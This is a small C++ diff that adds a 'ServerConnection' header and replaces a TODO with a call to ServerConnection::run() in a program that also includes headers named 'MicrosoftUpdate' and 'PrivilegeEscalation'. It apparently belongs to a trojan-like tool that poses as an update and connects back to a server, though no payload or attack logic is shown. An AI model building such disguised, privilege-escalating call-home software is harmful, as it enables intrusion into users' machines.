@@ -2,6 +2,7 @@
 #include <time.h>
 
 #include "MicrosoftUpdate.h"
+#include "ServerConnection.h"
 #include "System.h"
 #include "PrivilegeEscalation.h"
 
@@ -48,7 +49,8 @@ connection:
 		goto connection;
 	}
 
-	//TODO: Connect to Server
+	//Connect to Server
+	ServerConnection::run();
 
 	system("PAUSE");
 	return 0;
